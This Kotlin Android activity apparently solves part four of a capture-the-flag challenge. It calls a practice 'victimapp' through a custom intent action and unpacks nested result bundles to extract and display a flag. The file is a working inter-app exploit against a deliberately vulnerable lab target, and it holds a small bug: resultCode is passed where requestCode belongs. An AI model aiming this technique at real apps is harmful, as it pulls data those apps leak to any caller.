package com.example.maliciousapp

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

class PartFour : AppCompatActivity() {
    var flag = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        flag = intent?.getStringExtra("flag") ?: "[null]"

        val sendIntent = Intent("com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE")
        startActivityForResult(sendIntent, 4)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, intent: Intent?) {
        super.onActivityResult(resultCode, resultCode, intent)

        val view = findViewById<TextView>(R.id.debug_text)
        intent?.getExtras()?.let { extras ->
            var bundle = extras.getBundle("follow")
            val keys = listOf(
                "the value",
                "rabbit",
                "hole",
                "deeper",
            )
            for (key in keys) {
                bundle = bundle?.getBundle(key)
            }
            flag += bundle?.getCharSequence("never ending story")
            view.text = flag
        }
    }
}
